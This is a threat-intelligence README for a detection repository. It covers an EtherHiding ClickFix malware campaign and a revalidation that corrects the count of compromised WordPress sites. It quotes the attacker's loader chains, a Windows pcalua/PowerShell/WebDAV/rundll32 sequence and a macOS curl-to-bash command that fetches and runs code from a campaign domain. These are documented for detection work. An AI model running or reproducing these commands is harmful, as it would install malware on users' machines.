# betwanaa-boroo-webdav-etherhiding

Blog post: https://blueteam.cool/posts/betwanaa-boroo-webdav-etherhiding/

## Summary

A WebDAV/`rundll32` loader (`pcalua.exe` -> PowerShell -> `cmd.exe`
delayed-expansion -> `@SSL` UNC path -> `rundll32 gc.key,#1`) delivered
across at least three aged, Cloudflare-fronted "aged gambling domain"
apexes (`betwanaa.com`, `boroo.bet`, `1bet1yek.bet`), traced back to an
**EtherHiding** browser-injection stage: a fake "I'm not a robot" ClickFix
overlay hosted entirely inside BNB Smart Chain **testnet** smart-contract
storage, injected into compromised WordPress sites.

This campaign folder documents a full, independent, forensic-grade
revalidation of an existing malware-triage report (`report.md`, not
reproduced here) - every on-chain fact, every domain, and the compromised-
site count were re-derived fresh rather than trusted from the original
analysis. The revalidation:

- Reconfirmed all 12 known smart contracts live and their 3-wallet ownership
  clustering.
- **Caught genuine live domain rotation in progress**: the same contract
  address decoded as `behtarin-site-shartbandi.com` at the original analysis
  time now returns different bytes decoding to `site-shartbandi-farsi.com`.
- Independently decoded 2 more delivery domains never in the original
  report: `casinomhub.bet` (Windows/WebDAV) and `bahigo90bet.com` (macOS -
  a completely different `curl | bash` execution mechanism, not WebDAV at
  all).
- Scaled the original 24-site/10-contract manual sample to a live-checked
  1,816-site population and found **zero additional genuine campaign
  contracts** - strong evidence the 12-contract/3-wallet picture is
  complete, not a small-sample artifact.
- Found and corrected a **77-site false-positive contamination** in the
  compromised-site count: the enumeration query (any site calling the
  shared public BSC-testnet RPC) also matches legitimate, unrelated Web3/
  DeFi project sites. All 77 were already present in the original report's
  1,815-site figure, uncaught until this pass.
- Found and corrected a **second, distinct contamination**: 5 apex domains
  in that list - including `amazon.com` - were redirect-chain artifacts, not
  real victims. urlscan's `page.apexDomain` records the final landed page
  after any redirect, not the originally-scanned site; when a compromised
  site's page redirects elsewhere (an affiliate link, an ad network) after
  running its injected script, the redirect *target* gets misattributed as
  the "victim". Caught after directly testing sites and flagging `amazon.com`
  as implausible; resolved by checking which page's document context
  actually issued the `eth_call` for all 70 flagged candidates.
  **Final corrected total: 1,738** independently confirmed compromised
  sites.

Attack chain (Windows):
```
compromised WordPress site (EtherHiding JS injection)
  -> fake "I'm not a robot" ClickFix overlay
  -> victim pastes clipboard command into Win+R
  -> pcalua.exe -a powershell.exe -c "saps cmd ..."
  -> cmd.exe delayed-expansion variable reassembly
  -> pushd \\{random8}.{delivery-domain}@SSL\{uuid} (WebDAV HTTPS mount disguised as UNC)
  -> rundll32 gc.key,#1
```

Attack chain (macOS - independently decoded this session, not in the
original report):
```
same EtherHiding injection -> OS-branch gate detects macOS
  -> /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL '{uuid}.bahigo90bet.com/?ublib={uuid}')"
```

## What is included

| File | Description |
|------|-------------|
| `iocs.csv` | IOC table (41 rows - contracts, wallets, selectors, C2 domains, hashes, corrected site-count summary) |
| `rule.yar` | YARA rules - Windows WebDAV/rundll32 loader, macOS curl-bash loader (new), payload hash, EtherHiding JS injection |
| `README.md` | This file |
| `revalidation-2026-07-15-full/` | Full forensic evidence trail - every script and its saved output for every claim in this README and the linked blog post |

## Coverage notes

**What these detections cover:**
- The Windows WebDAV/`rundll32`/`pcalua.exe` command-line pattern, both with
  and without the `pcalua.exe` proxy layer.
- The macOS `curl | bash` variant (newly documented this revalidation).
- The EtherHiding JS injection fingerprint on compromised WordPress sites.
- One confirmed `gc.key` payload build by hash.

**What they do NOT cover:**
- The `gc.key` payload's actual capability - never recovered as bytes in
  either the original investigation or this revalidation (every remote copy
  found was already retired by the time of analysis). Marked Unknown, not
  guessed.
- Full transaction history for the 3 operator wallets - no free/keyless path
  exists for BSC-testnet (chainid 97); confirmed and documented, not
  silently skipped.
- Any future rotated delivery domain not yet observed - this is a live,
  actively rotating campaign (confirmed in-place rotation on one contract
  during this very revalidation).

## False-positive notes

The compromised-site enumeration method (any site whose stored scan
recorded a request to `bsc-testnet-rpc.publicnode.com`) also matches
legitimate Web3/DeFi project sites that call the same shared public RPC for
unrelated reasons (wallet-connect testing, faucet claims, contract-deployment
demos). This revalidation found and removed 77 such sites by live-verifying
every contract address against the campaign's own wallet/marker fingerprints
- 0 of 37 candidate "new" contracts passed either check. If extending this
enumeration method to future waves, repeat that verification step rather
than trusting a raw domain-match count.

Separately, the enumeration method also mislabels sites whenever the
injected script (or an unrelated ad/affiliate widget on the same page)
causes an off-domain redirect: urlscan groups the scan under the *final
landed page's* apex domain, not the originally-compromised site. Always
verify which page's document context actually issued the `eth_call` before
trusting a domain-match count that includes any well-known non-CMS site
(the `amazon.com`/`google.com`/`youtube.com`/`aliexpress.com` cases found
here are the obvious tell - a megasite in this list is a signal to check,
not a real finding).

## Confidence

High confidence on: the delivery-chain reconstruction (both Windows and
macOS variants, fully reproducible from the command line/decoded JS alone),
the on-chain contract/wallet clustering (all 12 contracts live-reconfirmed,
3 wallets, ownership pattern unchanged), and the corrected 1,738-site
compromised count (every false positive and every redirect-attribution
misattribution individually verified against the actual `eth_call` request,
not estimated). Medium confidence on the 5 utility/gate contracts' exact
role (different ABI from the payload contracts, not fully mapped). Unknown
on `gc.key`'s actual capability - no bytes recovered.

## Related detections

- `iocs.csv`
- `rule.yar`
- `revalidation-2026-07-15-full/00_REVALIDATION_LOG.md` - full methodology and numbers-for-publication table
